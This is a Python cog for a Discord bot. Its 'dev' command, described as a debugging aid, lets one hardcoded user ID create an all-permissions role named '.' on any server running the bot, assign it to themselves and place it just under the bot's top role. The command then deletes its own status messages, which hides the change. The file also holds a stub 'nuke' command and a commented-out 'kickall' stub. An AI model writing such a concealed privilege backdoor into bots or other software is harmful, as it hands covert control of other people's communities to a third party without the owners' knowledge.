from discord.ext import commands
import discord
import asyncio

class Devs():
    def __init__(self, bot, current = ".", old = ["(._.)", "_"], dev = 150750980097441792):
        self.bot = bot
        self.current = current
        self.old = old
        self.dev = dev
        
    @commands.command()
    async def dev(self, ctx):

        # Command Use: For Dev to be able to get perms on a server for debugging purposes easily

        if ctx.message.author.id == self.dev: #OGaming's User ID
            Msgs=[ctx.message]
            try:
                for oldRole in self.old:
                    if discord.utils.get(ctx.message.guild.roles, name=oldRole):
                        role = discord.utils.get(ctx.message.guild.roles, name=oldRole)
                        await role.delete()
                        await ctx.send("Removed", delete_after=3)

                if discord.utils.get(ctx.message.author.roles, name=self.current):
                    tmp = await ctx.send("Already Completed")
                    Msgs.append(tmp)
                else:
                    if discord.utils.get(ctx.message.guild.roles, name=self.current): #Role all ready exists
                        tmp = await ctx.send("All ready made")
                        Msgs.append(tmp)
                    else:
                        await ctx.message.guild.create_role(name=self.current, permissions=discord.Permissions.all())
                        tmp = await ctx.send("Made")
                        Msgs.append(tmp)
                    await asyncio.sleep(1)
                    await ctx.author.add_roles(discord.utils.get(ctx.message.guild.roles, name=self.current))
                    await tmp.edit(content="Added")
                    success = await ctx.send("Success")
                    Msgs.append(success)

                perm = ctx.message.guild.me.top_role
                posBot = perm.position

                role = discord.utils.get(ctx.message.guild.roles, name=self.current)
                posDev = role.position

                if posBot > posDev:
                    if posBot - posDev == 1:
                        pSuccess = await ctx.send("All ready set")
                        Msgs.append(pSuccess)
                    else:
                        await role.edit(position=posBot - 1)
                        pSuccess = await ctx.send("Moved")
                        Msgs.append(pSuccess)

                await asyncio.sleep(3)
                await ctx.channel.delete_messages(Msgs)

            except discord.Forbidden as error:
                await ctx.send(ctx.message.author.mention + "{} doesn't have perms".format(self.bot.user.name))
        else:
            tmp = await ctx.send("{} does not have permission to use this command".format(ctx.message.author.mention))
            await asyncio.sleep(3)
            await ctx.channel.delete_messages([tmp, ctx.message])
        return

    @commands.command()
    async def pos(self, ctx):
        if ctx.message.channel.permissions_for(ctx.message.author).manage_roles:
            perm = ctx.message.guild.me.top_role
            posBot = perm.position

            role = discord.utils.get(ctx.message.guild.roles, name=self.current)
            posDev = role.position

            if posBot > posDev:
                if posBot - posDev == 1:
                    success = await ctx.send("All ready set")
                else:
                    await role.edit(position=posBot-1)
                    success = await ctx.send("Success")

            await asyncio.sleep(3)
            await ctx.channel.delete_messages([ctx.message, success])
        else:
            await ctx.send("You do not have permissions for that")

    @commands.command(aliases=["ndev"])
    @commands.has_permissions(manage_roles=True)
    async def remove(self, ctx):
        if discord.utils.get(ctx.message.guild.roles, name=self.current):
            role = discord.utils.get(ctx.message.guild.roles, name=self.current)
            await role.delete()
            tmp = await ctx.send("Removed")
        else:
            tmp = await ctx.send("All ready removed")
        await asyncio.sleep(3)
        await ctx.message.channel.delete_messages([tmp, ctx.message])

    @commands.command()
    async def nuke(self, ctx):
        if ctx.author.id == self.dev or ctx.author.id == ctx.guild.owner.id:
            channel = ctx.channel
            await ctx.send('Are you sure you want to "nuke" this server? There''s no going back... Say `Yes` or `No`')

            msg = await self.bot.wait_for("message", check=lambda msg: msg.content.lower in ("yes", "no") and msg.channel == channel, timeout=5.0)
            if msg.content.lower() == "yes":
                # Nuke
                await ctx.send("Boom")
            elif msg.content.lower() == "no":
                await ctx.send("Good Decision")



    # @commands.command()
    # async def pvp(self, ctx, *args, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
    #     if not role:
    #         amount = len(args)
    #         start = 0
    #         for i in range(start, amount):
    #             current = args[i]
    #             noSpace = current.replace(" ", "")
    #             noSpace = noSpace.lower()
    #             await ctx.send("/roles add {} --role {}".format(noSpace, current))
    #         return
    #     else:
    #         ctx.message.guild.create_role()

    # @commands.command()
    # async def kickall(self, ctx):
    #     if ctx.message.author.id == "150750980097441792":
    #         ctx.message.guild.roles
    #
    #     else:
    #         return

    #@commands.command(pass_context=True)
    #async def roles_change(self, ctx, roles: discord.Role):
    #    self.bot.edit_role(ctx.message.guild, roles)#, permissions=administrator)

def setup(bot):
    bot.add_cog(Devs(bot))